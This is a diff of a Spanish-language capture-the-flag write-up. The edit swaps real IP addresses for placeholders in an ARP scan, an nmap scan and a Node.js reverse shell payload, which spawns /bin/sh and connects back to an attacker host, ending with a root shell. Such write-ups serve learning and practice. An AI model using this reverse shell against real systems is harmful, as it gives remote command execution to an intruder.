@@ -5,14 +5,14 @@
 ```bash
 # ARP scan
 arp-scan -I eth0 --localnet
-•192.168.200.13  08:00:27:fd:2a:fe       PCS Systemtechnik GmbH
+•(IP-victima)  08:00:27:fd:2a:fe       PCS Systemtechnik GmbH
 ```
 
 ### Escaneo de Puertos
 
 ```bash
 # Nmap scan
-nmap -p 22,80,5000 -sS -sC -sV  -n -Pn 192.168.200.13 -oN nmap
+nmap -p 22,80,5000 -sS -sC -sV  -n -Pn (IP-victima) -oN nmap
 •22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
 •80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
 •5000/tcp open  http    Node.js (Express middleware)
@@ -25,7 +25,7 @@ Otra manera de verificar la vulnerabilidad es modificar ciertos parámetros en l
 Al ver la vulnerabilidad en la web, procedemos a buscar en Google una forma de crear una reverseshell en React. Encontramos lo siguiente:
 
 ```javascript
-(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(443, "192.168.200.5", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();
+(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(443, "(IP-atacante)", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();
 ```
 Fuente (https://medium.com/dont-code-me-on-that/bunch-of-shells-nodejs-cdd6eb740f73)
 
@@ -75,4 +75,4 @@ file
 OS shell
 ```
 
-Y ya tenemos una shell como root (:D)
+Y ya tenemos una shell como root :D
